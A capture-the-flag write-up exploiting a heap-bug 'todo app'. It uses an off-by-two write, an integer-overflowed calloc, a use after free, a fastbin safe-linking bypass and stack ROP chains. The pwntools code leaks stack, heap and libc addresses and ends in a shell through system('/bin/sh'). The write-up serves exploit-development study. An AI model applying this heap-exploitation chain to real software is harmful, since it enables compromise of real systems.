# average_todo_app
## writeup
Yeah, there is no complete average ctf with no pwn todo app or pwn note taking, whoami to not abide by the rules?  
The exploit might seem a bit messy, but ill make sure to make it clean later.  

### todo app rules
Its nothing but a simple todo app creating, deleting, printing, finishing and editing a todo.  
A quick remark you might see at first glance is the extensive use of calloc. There is no exploitation of tcache, but we might tamper with fastbins.  

### exploit
So no tcache exploitation ? lets fill'em up  
```py
    log.info("filling tcache up")
    for i in range(7):
        allocate(b"a\n", 56)
    for i in range(7):
        delete(i)
```
Now that we have that out of the way, we need to find a leak, but that might be impossible because Calloc erases the content of the chunk before serving it.  
Not always, if the chunk was mmaped why would calloc waste the precious cycles of cpu to fill an already clean memory with 0s.  
```c
// https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3698
  /* Two optional cases in which clearing not necessary */
  if (chunk_is_mmapped (p))
    {
      if (__builtin_expect (perturb_byte, 0))
        return memset (mem, 0, sz);

      return mem;
    }
```

So we need one byte overflow to write to write into a perfectly aligned chunk, well ctodo does the job for us.  
```c
	printf("Battle name >> ");
	if ((size_t)(bsize + 2) > 1000){
		puts("integer overflow detected, exploit rejected");
		exit(EXIT_FAILURE);
	}
	read(0, todos[todo_count]->todo, bsize + 2);    // HERE
	todos[todo_count]->todo_size = bsize;
	todo_count++;
	printf("Battle added, todo index is %d\n", todo_count - 1);
}
```
But what are we leaking?? a heap address? we need no heap address we need a stack address or a stack address?  
Let's focus on a stack address, that's doable for now. all thanks to the emerg_buffer.  
The program keeps a temproray buffer so it can use it when calloc fails  

```c
	todos[todo_count]->todo = calloc(bsize, 1);
	if (todos[todo_count]->todo == NULL){
		todos[todo_count]->todo = tmp;
		todos[todo_count]->tmp = true;
	}
```

but thanks to gnu devs calloc never fails. or does it? [*Vsauce music*](https://www.youtube.com/watch?v=1dwu4iVA1yo)  

Yeah it does, you cant allocate 18446744073709551615 bytes. but that's what we're planning to do.  
`readint` reads a string and converts it using atoi to a signed integer, but calloc only accepts size_t as parameters, so inputting a -1 as a size would overflow to 184467... which calloc can't handle.  
```c
int readint(){
	char buffer[10];
	bzero(buffer, 10);
	if (read(0, buffer, 3) > 1){
		return (atoi(buffer));
	}
	return (0);
}
```

Enough theory and back to the exploit, now we can do 2 things :  
1. use the temprorary buffer and store its address in a chunk by using integer overflow  
2. bypass calloc memory protection  

```py
    a = allocate(b"a\n", 56)
    b = allocate(b"\x41", -1)       # using b as the tmp buffer to leak it
    log.info("freeing a")
    blocker = allocate(b"\x00", 16)       # merging the leak chunk
    delete(a)
    new_a = allocate(b"\x00" * 56 + b'\x41', 56)
    delete(b)
    edit(a, b"\x00" * 56 + b'\x43')
    liks = allocate(b"A" * 8, 56)      # getting the leak 11
    stack_leak = unpack_ptr(printt(11).replace(b"A" * 8, b""))
    edit(a, b"\x00" * 56 + b'\x41')
    log.info(f"stack leak {hex(stack_leak)}")
```

a is the first chunk, b is the second which contains the stack address, and block is just an allocated chunk to not mess with the top chunk.  
we delete `a` then edit its content, then free `b`  
now this is the fastbin  
[56] : a -> b   
we reallocate `a` again and edit its content to set linear chunk `b` that contains the stack address as mmaped.  
Now we can reallocate `b` to get the stack leak.  
Alright now if we wanna write in the stack we need to [bypass safe linking](https://ir0nstone.gitbook.io/notes/types/heap/safe-linking) and inject a chunk in the fastbin.  

```c
    hliks = allocate(b"A" * 8, 56)      # getting the leak 11
    delete(hliks)
    heap_base = unpack_ptr(printt(hliks)) << 12
    log.info(f"heap base {hex(heap_base)}")
```

we can use that just by a use after free on the print function.  
Well we got a heap leak to bypass safe linking and we have stack leak to write in the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table).  

As easy as it sounds, a use after free is all we need, and that whats `edit` is for.  
```py
    fake_fastbin_alloc = allocate(b"fastbin", 56)
    fake_fastbin_addr = heap_base + 0x630
    log.info(f"fake_fastbin_addr {hex(fake_fastbin_addr)}")
    delete(fake_fastbin_alloc)
    edit(fake_fastbin_alloc,  p64( ((fake_fastbin_addr + 16) >> 12 ) ^ (stack_leak - 8))[0:7] )
```

We start by allocating a fake fastbin the deleting it and editing the stack leak into it while bypassing all safe linking.  
Well all is left is to inject the rop and leak a libc address.  

```py
    fastbin = allocate(b"fb", 56)
    pop_rdi = 0x00000000004018c5
    pay = flat(
            cyclic(24),
            pop_rdi,
            elf.got.puts,
            elf.plt.puts,
            elf.sym.main
            )
    stack_chunk = allocate(pay, 56)
    log.info("triggering the rop")
    pp.recvuntil(b">> ")
    pp.sendline(b"69")
```
We allocate the parent chunk fake_fastbin_alloc then allocate the fake chunk and inject the rop there and exit to get the libc leak.  
```py
    a = allocate(b"heapdzeb\n", 64)
    b = allocate(b"\x51", -1)       # next chunk will be here
    delete(a)
    a_addr = heap_base + 2464
    edit(a, p64( ((a_addr + 16) >> 12 ) ^ (stack_leak + 8))[0:7] )
    waste = allocate(b"heapdzeb\n", 64)
    payload = flat(
            cyclic(24),
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")) + libc_base,
            pop_rdi+1,
            libc.sym.system + libc_base,
            )
    stack_chunk = allocate(payload, 64)
    log.info("triggering shellcode")
    pp.recvuntil(b">>")
    pp.sendline(b"69")
```

Rinse and repeat to get a shell.  
